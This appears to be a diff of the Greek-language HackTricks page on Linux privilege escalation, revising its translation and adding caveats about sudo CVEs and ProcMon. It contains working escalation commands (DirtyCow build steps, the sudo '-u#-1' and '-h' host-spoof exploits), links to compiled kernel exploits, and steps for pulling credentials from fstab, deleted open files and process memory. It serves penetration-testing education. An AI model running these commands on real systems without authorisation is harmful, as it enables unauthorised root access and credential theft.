@@ -1,53 +1,65 @@
-# Κλιμάκωση προνομίων στο Linux
+# Κλιμάκωση προνομίων Linux
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Για ευρύτερο υπόβαθρο και ιστορικές ροές εργασίας enumeration, συγκρίνετε τους πόρους g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation και linux-private-i που παρατίθενται στις αναφορές.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>
+Για ευρύτερο υπόβαθρο και ιστορικές ροές εργασίας enumeration, συγκρίνετε τους πόρους g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation και linux-private που παρατίθενται στις αναφορές.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>
 
 ## Πληροφορίες συστήματος
 
-### Πληροφορίες OS
+### Πληροφορίες λειτουργικού συστήματος
 
-Ας ξεκινήσουμε συλλέγοντας κάποιες πληροφορίες για το OS που εκτελείται
+Ας ξεκινήσουμε συλλέγοντας πληροφορίες για το λειτουργικό σύστημα που εκτελείται
+
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null # old, not by default on many systems
 cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
+
 ### Διαδρομή
 
-Αν έχετε **δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`**, ενδέχεται να μπορείτε να κάνετε hijack ορισμένες βιβλιοθήκες ή δυαδικά αρχεία:
+Αν **έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`**, ίσως μπορέσετε να υποκλέψετε κάποιες βιβλιοθήκες ή δυαδικά αρχεία:
+
 ```bash
 echo $PATH
 ```
+
 ### Πληροφορίες περιβάλλοντος
 
-Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή API keys στις μεταβλητές περιβάλλοντος;
+Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή κλειδιά API στις μεταβλητές περιβάλλοντος;
+
 ```bash
 (env || set) 2>/dev/null
 ```
+
 ### Kernel exploits
 
-Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για την κλιμάκωση δικαιωμάτων.
+Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για privilege escalation.
+
+Η [ενότητα Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) συγκεντρώνει περιπτώσεις τοπικού privilege escalation και συνδέσμους προς τις πιο αναλυτικές παρουσιάσεις του Linux kernel στο Binary Exploitation. Επαληθεύστε το επηρεαζόμενο build και τη διαμόρφωση πριν δοκιμάσετε κάποια μελέτη περίπτωσης.
+
 ```bash
 cat /proc/version
 uname -a
 searchsploit "Linux Kernel"
 ```
-Μπορείτε να βρείτε μια καλή λίστα με ευάλωτους kernels και ορισμένα ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
-Άλλοι ιστότοποι όπου μπορείτε να βρείτε ορισμένα **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
+
+Μπορείτε να βρείτε μια καλή λίστα ευάλωτων kernels και ορισμένα ήδη **μεταγλωττισμένα exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
+Άλλοι ιστότοποι όπου μπορείτε να βρείτε **μεταγλωττισμένα exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
 Για να εξαγάγετε όλες τις ευάλωτες εκδόσεις kernel από αυτόν τον ιστότοπο, μπορείτε να εκτελέσετε:
+
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
+
 Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση kernel exploits είναι:
 
 [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
 [linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
-[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε το IN victim, ελέγχει exploits μόνο για kernel 2.x)
+[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε το στο θύμα· ελέγχει μόνο για exploits σε kernel 2.x)
 
-Να **αναζητάτε πάντα την έκδοση του kernel στο Google**, ίσως η έκδοση του kernel σας αναφέρεται σε κάποιο kernel exploit και έτσι θα είστε βέβαιοι ότι αυτό το exploit είναι έγκυρο.
+Πάντα **αναζητήστε την έκδοση του kernel στο Google**. Ίσως η έκδοση του kernel σας αναφέρεται σε κάποιο kernel exploit, οπότε θα είστε βέβαιοι ότι το exploit είναι έγκυρο.
 
 Πρόσθετες τεχνικές kernel exploitation:
 
@@ -61,6 +73,7 @@ curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2
 ### CVE-2016-5195 (DirtyCow)
 
 Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+
 ```bash
 # make dirtycow stable
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
@@ -68,102 +81,129 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
 ```
+
 ### Έκδοση Sudo
 
-Με βάση τις ευάλωτες εκδόσεις του sudo που εμφανίζονται στο:
+Με βάση τις ευάλωτες εκδόσεις sudo που εμφανίζονται στο:
+
 ```bash
 searchsploit sudo
 ```
+
 Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
+
 ```bash
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
+
 ### Sudo < 1.9.17p1
 
-Οι εκδόσεις του Sudo πριν από την 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε μη προνομιούχους τοπικούς χρήστες να κλιμακώσουν τα δικαιώματά τους σε root μέσω της επιλογής `--chroot` του sudo, όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από έναν κατάλογο που ελέγχεται από τον χρήστη.<sup>[[28]](#references)[[29]](#references)</sup>
+Το upstream sudo **1.9.14 έως 1.9.17** επιτρέπει σε μη προνομιούχους τοπικούς χρήστες να αποκτήσουν δικαιώματα root μέσω της επιλογής `--chroot`, όταν το sudo φορτώνει το `/etc/nsswitch.conf` από κατάλογο που ελέγχεται από τον χρήστη· το upstream διόρθωσε το πρόβλημα στην έκδοση **1.9.17p1**. Ελέγξτε κάθε εκτελέσιμο sudo binary με root-setuid στα σχετικά paths, καθώς το `sudo -V` αναφέρει μόνο το binary που επιλέγεται μέσω του `PATH`. Τα πακέτα διανομών ενδέχεται να έχουν μεταφέρει τη διόρθωση σε παλαιότερη έκδοση χωρίς να αλλάξουν τη συμβολοσειρά έκδοσης του upstream, γι' αυτό ελέγξτε επίσης την κατάσταση του πακέτου από τον vendor. Δείτε τη [συμβουλευτική ανακοίνωση του maintainer του sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>
 
-Ακολουθεί ένα [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) για την εκμετάλλευση αυτής της [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν εκτελέσετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` είναι ευάλωτη και ότι υποστηρίζει τη δυνατότητα `chroot`.
+Ακολουθεί ένα [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) για την εκμετάλλευση αυτής της [ευπάθειας](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν εκτελέσετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` είναι ευάλωτη και υποστηρίζει τη λειτουργία `chroot`.
 
-Για περισσότερες πληροφορίες, ανατρέξτε στην αρχική [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>
+Για περισσότερες πληροφορίες, ανατρέξτε στην αρχική [συμβουλευτική ανακοίνωση για την ευπάθεια](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>
 
-### Παράκαμψη host-based κανόνων του Sudo (CVE-2025-32462)
+### Παράκαμψη κανόνων sudo βάσει host (CVE-2025-32462)
 
-Το Sudo πριν από την έκδοση 1.9.17p1 (αναφερόμενο επηρεαζόμενο εύρος: **1.8.8–1.9.17**) μπορεί να αξιολογεί host-based κανόνες sudoers χρησιμοποιώντας το **hostname που παρέχεται από τον χρήστη** μέσω του `sudo -h <host>` αντί για το **πραγματικό hostname**. Αν το sudoers παραχωρεί ευρύτερα δικαιώματα σε έναν άλλο host, μπορείτε να κάνετε **spoof** αυτού του host τοπικά.<sup>[[29]](#references)</sup>
+Το upstream sudo **1.8.8 έως 1.9.17** μπορεί να αξιολογήσει κανόνες sudoers βάσει host χρησιμοποιώντας το **hostname που παρέχει ο χρήστης** μέσω του `sudo -h <host>` αντί για το **πραγματικό hostname**· το upstream διόρθωσε το πρόβλημα στην έκδοση **1.9.17p1**. Ο χρήστης πρέπει και πάλι να έχει αντίστοιχη καταχώριση sudoers στον επιλεγμένο host. Ελέγξτε τις διορθώσεις που έχουν μεταφερθεί από τους vendors και τα εναλλακτικά sudo binaries, καθώς και την τοπική πολιτική. Δείτε τη [συμβουλευτική ανακοίνωση του maintainer του sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>
 
 Απαιτήσεις:
-- Ευάλωτη έκδοση του sudo
-- Ειδικοί για host κανόνες sudoers (ο host δεν είναι ούτε το τρέχον hostname ούτε `ALL`)
+- Ευάλωτη έκδοση sudo
+- Κανόνες sudoers ειδικοί για host (ο host δεν είναι ούτε το τρέχον hostname ούτε `ALL`)
 
 Παράδειγμα μοτίβου sudoers:
+
 ```
 Host_Alias     SERVERS = devbox, prodbox
 Host_Alias     PROD    = prodbox
 alice          SERVERS, !PROD = NOPASSWD:ALL
 ```
-Εκμετάλλευση με πλαστογράφηση του επιτρεπόμενου host:
+
+Exploit μέσω spoofing του επιτρεπόμενου host:
+
 ```bash
 sudo -h devbox id
 sudo -h devbox -i
 ```
-Αν η επίλυση του spoofed ονόματος αποτυγχάνει, προσθέστε το στο `/etc/hosts` ή χρησιμοποιήστε ένα hostname που εμφανίζεται ήδη σε logs/configs, ώστε να αποφύγετε τα DNS lookups.
+
+Αν η επίλυση του επιλεγμένου ονόματος αποτύχει, επαληθεύστε πώς επιλύεται αυτό το όνομα στον host. Το ότι εμφανίζεται ένα όνομα σε ένα log ή αρχείο ρυθμίσεων δεν σημαίνει ότι μπορεί να επιλυθεί, ενώ η τροποποίηση του `/etc/hosts` συνήθως απαιτεί δικαιώματα εγγραφής με αυξημένα προνόμια.
 
 #### sudo < v1.8.28
 
-Από @sickrov
+Αυτό το [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) απαιτεί έναν ενεργό κανόνα sudo που επιτρέπει την εκτέλεση μιας εντολής ως `ALL` χρήστες, εξαιρώντας τον root, όπως `(ALL, !root) /bin/bash`. Ο καλών πρέπει επίσης να έχει δικαίωμα χρήσης αυτού του κανόνα, συμπεριλαμβανομένης τυχόν απαίτησης ελέγχου ταυτότητας. Ελέγξτε τη σχετική ανακοίνωση ασφαλείας του εγκατεστημένου πακέτου: οι προμηθευτές ενσωμάτωσαν την επιδιόρθωση σε εκδόσεις των οποίων η εμφανιζόμενη upstream έκδοση παραμένει κάτω από την 1.8.28. Ένας κανόνας `!root` ή μια παλιά έκδοση από μόνη της δεν επιβεβαιώνει ότι το σύστημα είναι ευάλωτο. Μην δοκιμάζετε προνομιούχες εντολές κατά την παθητική απαρίθμηση.
+
 ```
 sudo -u#-1 /bin/bash
 ```
+
 ### Αποτυχία επαλήθευσης υπογραφής του dmesg
 
-Δείτε το **smasher2 box του HTB** για ένα **example** του τρόπου με τον οποίο θα μπορούσε να γίνει exploit αυτή η vuln
+Δείτε το **smasher2 box of HTB** για ένα **παράδειγμα** του τρόπου με τον οποίο θα μπορούσε να γίνει exploit αυτής της ευπάθειας.
+
 ```bash
 dmesg 2>/dev/null | grep "signature"
 ```
+
 ### Περισσότερη απαρίθμηση συστήματος
+
 ```bash
 date 2>/dev/null #Date
 (df -h || lsblk) #System stats
 lscpu #CPU info
 lpstat -a 2>/dev/null #Printers info
 ```
-## Απαρίθμηση πιθανών αμυνών
+
+## Καταγράψτε τις πιθανές άμυνες
 
 ### AppArmor
+
 ```bash
 if [ `which aa-status 2>/dev/null` ]; then
-aa-status
-elif [ `which apparmor_status 2>/dev/null` ]; then
-apparmor_status
-elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
-ls -d /etc/apparmor*
-else
-echo "Not found AppArmor"
+    aa-status
+  elif [ `which apparmor_status 2>/dev/null` ]; then
+    apparmor_status
+  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
+    ls -d /etc/apparmor*
+  else
+    echo "Not found AppArmor"
 fi
 ```
+
 ### Grsecurity
+
 ```bash
 ((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
 ```
+
 ### PaX
+
 ```bash
 (which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
 ```
+
 ### Execshield
+
 ```bash
 (grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
 ```
+
 ### SElinux
+
 ```bash
-(sestatus 2>/dev/null || echo "Not found sestatus")
+ (sestatus 2>/dev/null || echo "Not found sestatus")
 ```
+
 ### ASLR
+
 ```bash
 cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 #If 0, not enabled
 ```
+
 ## Container Breakout
 
-Αν βρίσκεστε μέσα σε ένα container, ξεκινήστε με την ακόλουθη ενότητα container-security και, στη συνέχεια, μεταβείτε στις σελίδες abuse που αφορούν το εκάστοτε runtime:
+Αν βρίσκεστε μέσα σε ένα container, ξεκινήστε από την ακόλουθη ενότητα για την ασφάλεια των container και στη συνέχεια κάντε pivot στις σελίδες κατάχρησης που αφορούν το συγκεκριμένο runtime:
 
 
 {{#ref}}
@@ -172,108 +212,133 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 
 ## Δίσκοι
 
-Ελέγξτε **τι είναι προσαρτημένο και αποπροσαρτημένο**, πού και γιατί. Αν κάτι είναι αποπροσαρτημένο, μπορείτε να δοκιμάσετε να το προσαρτήσετε και να ελέγξετε για private info
+Ελέγξτε **τι είναι προσαρτημένο και τι όχι**, πού και γιατί. Αν κάτι δεν είναι προσαρτημένο, μπορείτε να δοκιμάσετε να το προσαρτήσετε και να ελέγξετε αν περιέχει ιδιωτικές πληροφορίες.
+
 ```bash
 ls /dev 2>/dev/null | grep -i "sd"
 cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
 #Check if credentials in fstab
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
 ```
+
 ## Χρήσιμο λογισμικό
 
-Απαρίθμηση χρήσιμων binaries
+Καταγράψτε χρήσιμα εκτελέσιμα αρχεία
+
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
-Επίσης, ελέγξτε αν είναι εγκατεστημένος **κάποιος compiler**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το κάνετε compile στο machine όπου πρόκειται να το χρησιμοποιήσετε (ή σε κάποιο παρόμοιο).
+
+Επίσης, ελέγξτε αν **είναι εγκατεστημένος κάποιος μεταγλωττιστής**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το μεταγλωττίσετε στο μηχάνημα όπου πρόκειται να το χρησιμοποιήσετε (ή σε κάποιο παρόμοιο).
+
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
+
 ### Εγκατεστημένο ευάλωτο λογισμικό
 
-Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios, για παράδειγμα, η οποία θα μπορούσε να γίνει exploited για privilege escalation…\
-Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
+Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα), η οποία θα μπορούσε να αξιοποιηθεί για κλιμάκωση προνομίων…\
+Συνιστάται να ελέγχετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
+
 ```bash
 dpkg -l #Debian
 rpm -qa #Centos
 ```
-Αν έχετε πρόσβαση SSH στο μηχάνημα, μπορείτε επίσης να χρησιμοποιήσετε το **openVAS** για να ελέγξετε για παρωχημένο και ευάλωτο λογισμικό εγκατεστημένο στο μηχάνημα.
 
-> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες, οι περισσότερες από τις οποίες θα είναι άχρηστες. Επομένως, συνιστάται η χρήση εφαρμογών όπως το OpenVAS ή παρόμοιων, οι οποίες θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_
+Αν έχεις SSH access στο μηχάνημα, μπορείς επίσης να χρησιμοποιήσεις το **OpenVAS** για να ελέγξεις αν έχει εγκατεστημένο παρωχημένο και ευάλωτο λογισμικό.
+
+> [!NOTE] > _Σημείωσε ότι αυτές οι εντολές εμφανίζουν πολλές πληροφορίες, οι περισσότερες από τις οποίες δεν θα είναι χρήσιμες. Γι’ αυτό συνιστάται να χρησιμοποιήσεις κάποια εφαρμογή όπως το OpenVAS ή κάποια παρόμοια, η οποία θα ελέγξει αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits._
 
 ## Διεργασίες
 
-Εξετάστε **ποιες διεργασίες** εκτελούνται και ελέγξτε αν κάποια διεργασία διαθέτει **περισσότερα privileges από όσα θα έπρεπε** (μήπως εκτελείται κάποιο tomcat από τον root;).
+Ρίξε μια ματιά στο **ποιες διεργασίες** εκτελούνται και έλεγξε αν κάποια διεργασία έχει **περισσότερα προνόμια από όσα θα έπρεπε** (για παράδειγμα, εκτελείται κάποιο tomcat από τον root;).
+
 ```bash
 ps aux
 ps -ef
 top -n 1
 ```
-Πάντα να ελέγχετε για πιθανούς [**electron/cef/chromium debuggers** που εκτελούνται, καθώς μπορεί να τους εκμεταλλευτείτε για privilege escalation](../../software-information/electron-cef-chromium-debugger-abuse.md). Το **Linpeas** τους εντοπίζει ελέγχοντας την παράμετρο `--inspect` στη γραμμή εντολών της διεργασίας.\
-Ελέγξτε επίσης **τα δικαιώματά σας στα binaries των διεργασιών**· ίσως μπορείτε να αντικαταστήσετε κάποιο.
 
-### Αλυσίδες parent-child μεταξύ χρηστών
+Να ελέγχετε πάντα αν εκτελούνται [**electron/cef/chromium debuggers**· μπορείτε να τα εκμεταλλευτείτε για privilege escalation](../../software-information/electron-cef-chromium-debugger-abuse.md). Το **Linpeas** τα εντοπίζει ελέγχοντας αν υπάρχει η παράμετρος `--inspect` στη γραμμή εντολών της διεργασίας.\
+Ελέγξτε επίσης τα δικαιώματά σας στα εκτελέσιμα αρχεία των διεργασιών· ίσως μπορείτε να αντικαταστήσετε κάποιο.
 
-Μια child διεργασία που εκτελείται με **διαφορετικό χρήστη** από τον parent της δεν είναι αυτομάτως κακόβουλη, αλλά αποτελεί χρήσιμο **triage signal**. Ορισμένες μεταβάσεις είναι αναμενόμενες (`root` που εκκινεί έναν service user, login managers που δημιουργούν διεργασίες συνεδρίας), όμως ασυνήθιστες αλυσίδες μπορεί να αποκαλύψουν wrappers, debug helpers, persistence ή αδύναμα όρια εμπιστοσύνης runtime.
+### Αλυσίδες γονικών και θυγατρικών διεργασιών μεταξύ χρηστών
+
+Μια θυγατρική διεργασία που εκτελείται ως **διαφορετικός χρήστης** από τη γονική της δεν είναι αυτομάτως κακόβουλη, αλλά αποτελεί χρήσιμο **σήμα για αρχική αξιολόγηση**. Ορισμένες μεταβάσεις είναι αναμενόμενες (`root` που εκκινεί μια υπηρεσία ως χρήστης υπηρεσίας, διαχειριστές σύνδεσης που δημιουργούν διεργασίες συνεδρίας), αλλά ασυνήθιστες αλυσίδες μπορεί να αποκαλύψουν wrappers, βοηθητικά εργαλεία εντοπισμού σφαλμάτων, persistence ή αδύναμα όρια εμπιστοσύνης κατά τον χρόνο εκτέλεσης.
 
 Γρήγορος έλεγχος:
+
 ```bash
 ps -eo pid,ppid,user,comm,args --sort=ppid
 pstree -alp
 ```
-Αν εντοπίσετε μια απρόσμενη αλυσίδα, εξετάστε τη γραμμή εντολών του parent και όλα τα αρχεία που επηρεάζουν τη συμπεριφορά του (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Σε αρκετά πραγματικά μονοπάτια privesc, το ίδιο το child δεν ήταν writable, αλλά ήταν το **parent-controlled config** ή η αλυσίδα helper.
 
-### Διαγραμμένα executables και αρχεία με deleted-open
+Αν εντοπίσετε μια απρόσμενη αλυσίδα, εξετάστε τη γραμμή εντολών της γονικής διεργασίας και όλα τα αρχεία που επηρεάζουν τη συμπεριφορά της (`config`, `EnvironmentFile`, βοηθητικά scripts, κατάλογος εργασίας, εγγράψιμα ορίσματα). Σε αρκετές πραγματικές διαδρομές privesc, το ίδιο το child δεν ήταν εγγράψιμο, αλλά ήταν το config που ελεγχόταν από το parent ή η αλυσίδα των helper.
 
-Τα runtime artifacts είναι συχνά ακόμη προσβάσιμα **μετά τη διαγραφή**. Αυτό είναι χρήσιμο τόσο για privilege escalation όσο και για την ανάκτηση evidence από μια διεργασία που έχει ήδη ανοίξει ευαίσθητα αρχεία.
+### Διαγραμμένα εκτελέσιμα και αρχεία ανοιχτά μετά τη διαγραφή
 
-Ελέγξτε για διαγραμμένα executables:
+Τα artifacts χρόνου εκτέλεσης παραμένουν συχνά προσβάσιμα **μετά τη διαγραφή**. Αυτό είναι χρήσιμο τόσο για privilege escalation όσο και για την ανάκτηση στοιχείων από μια διεργασία που έχει ήδη ανοιχτά ευαίσθητα αρχεία.
+
+Ελέγξτε για διαγραμμένα εκτελέσιμα:
+
 ```bash
 pid=<PID>
 ls -l /proc/$pid/exe
 readlink /proc/$pid/exe
 tr '\0' ' ' </proc/$pid/cmdline; echo
 ```
-Αν το `/proc/<PID>/exe` δείχνει σε `(deleted)`, η διεργασία εξακολουθεί να εκτελεί την παλιά binary image από τη μνήμη. Αυτό αποτελεί ισχυρή ένδειξη για περαιτέρω διερεύνηση, επειδή:
 
-- το executable που αφαιρέθηκε μπορεί να περιέχει ενδιαφέροντα strings ή credentials
-- η εκτελούμενη διεργασία μπορεί να εξακολουθεί να εκθέτει χρήσιμα file descriptors
-- ένα διαγραμμένο privileged binary μπορεί να υποδεικνύει πρόσφατο tampering ή απόπειρα cleanup
+Αν το `/proc/<PID>/exe` δείχνει στο `(deleted)`, η διεργασία εξακολουθεί να εκτελεί την παλιά binary image από τη μνήμη. Αυτό είναι ισχυρή ένδειξη για περαιτέρω διερεύνηση, επειδή:
 
-Συλλέξτε globally τα deleted-open files:
+- το διαγραμμένο εκτελέσιμο μπορεί να περιέχει ενδιαφέροντα strings ή credentials
+- η διεργασία που εκτελείται μπορεί να εξακολουθεί να εκθέτει χρήσιμους file descriptors
+- ένα διαγραμμένο privileged binary μπορεί να υποδηλώνει πρόσφατη παραποίηση ή απόπειρα εκκαθάρισης
+
+Συλλέξτε τα ανοιχτά διαγραμμένα αρχεία καθολικά:
+
 ```bash
 lsof +L1
 ```
-Αν βρείτε έναν ενδιαφέροντα descriptor, ανακτήστε τον απευθείας:
+
+Αν εντοπίσετε έναν ενδιαφέροντα περιγραφέα, ανακτήστε τον απευθείας:
+
 ```bash
 ls -l /proc/<PID>/fd
 cat /proc/<PID>/fd/<FD>
 ```
-Αυτό είναι ιδιαίτερα χρήσιμο όταν μια διεργασία έχει ακόμη ανοιχτό ένα διαγραμμένο secret, script, database export ή flag file.
+
+Αυτό είναι ιδιαίτερα χρήσιμο όταν μια διεργασία εξακολουθεί να έχει ανοιχτό ένα διαγραμμένο μυστικό, script, εξαγωγή βάσης δεδομένων ή αρχείο flag.
 
 ### Παρακολούθηση διεργασιών
 
-Μπορείτε να χρησιμοποιήσετε εργαλεία όπως το [**pspy**](https://github.com/DominicBreuker/pspy) για την παρακολούθηση διεργασιών. Αυτό μπορεί να είναι πολύ χρήσιμο για τον εντοπισμό ευάλωτων διεργασιών που εκτελούνται συχνά ή όταν πληρούνται συγκεκριμένες απαιτήσεις.
+Μπορείτε να χρησιμοποιήσετε εργαλεία όπως το [**pspy**](https://github.com/DominicBreuker/pspy) για την παρακολούθηση διεργασιών. Αυτό μπορεί να είναι πολύ χρήσιμο για τον εντοπισμό ευάλωτων διεργασιών που εκτελούνται συχνά ή όταν πληρούνται κάποιες προϋποθέσεις.
+
+#### Linux ProcMon μέσω sudo
+
+Το [ProcMon για Linux](https://github.com/microsoft/ProcMon-for-Linux) μπορεί να ανιχνεύει επιλεγμένες διεργασίες και system calls και να αποθηκεύει ένα SQLite trace. Αν το `sudo -l` επιτρέπει την εκτέλεση της εντολής `procmon` χωρίς περιορισμούς και με δυνατότητες root, εξετάστε αν θα μπορούσε να παρακολουθεί την είσοδο ή την έξοδο διεργασίας άλλου χρήστη. Το δικαίωμα αυτό αποτελεί μόνο αφορμή για περαιτέρω έλεγχο: σημαντικά είναι η υποστήριξη από το tracer, η ισχύουσα πολιτική και η δραστηριότητα μιας κατάλληλης διεργασίας. Τα αρχεία trace μπορεί να περιέχουν μυστικά, γι' αυτό ελέγχετε προσεκτικά τις εξουσιοδοτημένες εξαγωγές και αποφύγετε τη συλλογή δεδομένων από άσχετες διεργασίες.
 
 ### Μνήμη διεργασιών
 
-Ορισμένες υπηρεσίες ενός server αποθηκεύουν **credentials σε clear text μέσα στη μνήμη**.\
-Κανονικά θα χρειαστείτε **root privileges** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είστε ήδη root και θέλετε να ανακαλύψετε περισσότερα credentials.\
-Ωστόσο, θυμηθείτε ότι **ως regular user μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.
+Ορισμένες υπηρεσίες ενός server αποθηκεύουν **διαπιστευτήρια σε απλό κείμενο στη μνήμη**.\
+Συνήθως θα χρειαστείτε **προνόμια root** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες. Επομένως, αυτό είναι συνήθως πιο χρήσιμο όταν έχετε ήδη πρόσβαση root και θέλετε να εντοπίσετε περισσότερα διαπιστευτήρια.\
+Ωστόσο, να θυμάστε ότι **ως απλός χρήστης μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.
 
 > [!WARNING]
-> Σημειώστε ότι σήμερα τα περισσότερα μηχανήματα **δεν επιτρέπουν ptrace από προεπιλογή**, πράγμα που σημαίνει ότι δεν μπορείτε να κάνετε dump άλλων διεργασιών που ανήκουν στον unprivileged χρήστη σας.
+> Σημειώστε ότι σήμερα τα περισσότερα μηχανήματα **δεν επιτρέπουν το ptrace από προεπιλογή**, πράγμα που σημαίνει ότι δεν μπορείτε να κάνετε dump άλλων διεργασιών που ανήκουν στον μη προνομιούχο χρήστη σας.
 >
 > Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
 >
-> - **kernel.yama.ptrace_scope = 0**: όλες οι διεργασίες μπορούν να γίνουν debug, εφόσον έχουν το ίδιο uid. Αυτός είναι ο κλασικός τρόπος λειτουργίας του ptracing.
-> - **kernel.yama.ptrace_scope = 1**: μόνο μια parent διεργασία μπορεί να γίνει debug.
